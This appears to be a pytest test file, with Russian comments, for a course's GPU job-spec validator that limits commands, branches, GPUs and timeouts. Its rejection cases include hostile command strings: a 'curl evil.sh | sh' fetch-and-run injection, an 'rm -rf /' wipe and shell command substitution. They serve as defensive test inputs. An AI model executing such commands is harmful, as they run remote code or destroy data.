from __future__ import annotations

from pathlib import Path, PurePosixPath

import pytest

from scripts.jobs.job_spec import JobSpecError, load_spec_text, parse_command

SPEC_PATH = PurePosixPath("jobs/queue/ilya-demo.yml")


def spec_text(**overrides: object) -> str:
    """Собирает YAML спеки, подменяя отдельные поля."""
    fields: dict[str, object] = {
        "branch": "Ilya/demo",
        "command": "python scripts/benchmarks/run_demo.py --limit 5",
        "gpus": 1,
        "timeout_minutes": 30,
    }
    fields.update(overrides)
    return "\n".join(f"{key}: {value}" for key, value in fields.items()) + "\n"


def head(repo: Path) -> str:
    from tests.jobs.conftest import git

    return git(repo, "rev-parse", "HEAD")


# --- команды ------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "python scripts/benchmarks/run_demo.py --limit 5",
        "python3 scripts/benchmarks/run_demo.py",
        "bash scripts/serve.sh",
        "uv run python scripts/benchmarks/run_demo.py",
        "uv run kedro run --env experiments/baseline",
        # Кавычки разбираются здесь один раз, дальше shell не участвует.
        'python scripts/benchmarks/run_demo.py --prompt "two words"',
    ],
)
def test_accepts_repository_scripts(student_repo: Path, command: str) -> None:
    argv = parse_command(command, repo=student_repo, commit_sha=head(student_repo))
    assert argv[0] in {"python", "python3", "bash", "uv"}


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("python run_demo.py; curl evil.sh | sh", "shell metacharacters"),
        ("python run_demo.py && rm -rf /", "shell metacharacters"),
        ("python $(echo run_demo.py)", "shell metacharacters"),
        ("bash /etc/init.d/nginx", "must be relative"),
        ("python ../../escape.py", "must not contain '..'"),
        ("python scripts/benchmarks/untracked.py", "is not tracked"),
        ("curl http://example.com", "must start with one of"),
        ("python -m http.server", "flags like -m or -c are not allowed"),
        ("python -c pass", "flags like -m or -c are not allowed"),
        ("bash scripts/benchmarks/run_demo.py", "expects a .sh script"),
        ("uv run ruff check", "uv is allowed only as"),
        ("uv run kedro run --env experiments/missing", "is not tracked"),
        ("uv run kedro run", "requires --env"),
        ("", "must not be empty"),
    ],
)
def test_rejects_everything_else(
    student_repo: Path, command: str, expected: str
) -> None:
    with pytest.raises(JobSpecError, match=expected):
        parse_command(command, repo=student_repo, commit_sha=head(student_repo))


def test_untracked_file_on_disk_is_still_rejected(student_repo: Path) -> None:
    """Файл рядом на диске не считается скриптом репозитория."""
    (student_repo / "scripts" / "benchmarks" / "sneaky.py").write_text("print(1)\n")

    with pytest.raises(JobSpecError, match="is not tracked"):
        parse_command(
            "python scripts/benchmarks/sneaky.py",
            repo=student_repo,
            commit_sha=head(student_repo),
        )


# --- спека целиком ------------------------------------------------------------


def test_valid_spec_resolves_branch_to_commit(student_repo: Path) -> None:
    spec = load_spec_text(spec_text(), spec_path=SPEC_PATH, repo=student_repo)

    assert spec.run_id == "ilya-demo"
    assert spec.student == "Ilya"
    assert spec.commit_sha == head(student_repo)
    assert spec.timeout_seconds == 1800.0
    assert spec.argv == ["python", "scripts/benchmarks/run_demo.py", "--limit", "5"]


@pytest.mark.parametrize(
    ("overrides", "expected"),
    [
        ({"gpus": 3}, "gpus must be between 0 and 2"),
        ({"gpus": "one"}, "gpus must be an integer"),
        ({"timeout_minutes": 0}, "timeout_minutes must be between 1 and 120"),
        ({"timeout_minutes": 500}, "timeout_minutes must be between 1 and 120"),
        ({"branch": "Ilya/missing"}, "not found"),
    ],
)
def test_rejects_bad_fields(
    student_repo: Path, overrides: dict[str, object], expected: str
) -> None:
    with pytest.raises(JobSpecError, match=expected):
        load_spec_text(
            spec_text(**overrides), spec_path=SPEC_PATH, repo=student_repo
        )


@pytest.mark.parametrize(
    "branch",
    ["mallory/demo", "feature/demo", "Ilyaa/demo", "ilya/demo"],
)
def test_rejects_branches_outside_the_allow_list(
    student_repo: Path, branch: str
) -> None:
    """Запускать можно только из веток четырёх участников курса."""
    with pytest.raises(JobSpecError, match="must start with one of"):
        load_spec_text(
            spec_text(branch=branch), spec_path=SPEC_PATH, repo=student_repo
        )


def test_run_id_comes_from_the_file_name(student_repo: Path) -> None:
    """Имя файла становится каталогом результатов, поэтому оно и есть run_id."""
    spec = load_spec_text(
        spec_text(),
        spec_path=PurePosixPath("jobs/queue/ilya-math500-temp07.yml"),
        repo=student_repo,
    )

    assert spec.run_id == "ilya-math500-temp07"


def test_rejects_a_file_name_that_is_not_a_valid_run_id(student_repo: Path) -> None:
    with pytest.raises(JobSpecError, match="not a valid run_id"):
        load_spec_text(
            spec_text(),
            spec_path=PurePosixPath("jobs/queue/ilya demo.yml"),
            repo=student_repo,
        )


def test_rejects_unknown_field(student_repo: Path) -> None:
    """Опечатка в имени поля не должна тихо превращаться в запуск с дефолтами."""
    text = spec_text() + "gpu: 2\n"

    with pytest.raises(JobSpecError, match="unknown fields: gpu"):
        load_spec_text(text, spec_path=SPEC_PATH, repo=student_repo)


def test_rejects_missing_field(student_repo: Path) -> None:
    text = "\n".join(
        line for line in spec_text().splitlines() if not line.startswith("gpus")
    )

    with pytest.raises(JobSpecError, match="missing required fields: gpus"):
        load_spec_text(text, spec_path=SPEC_PATH, repo=student_repo)
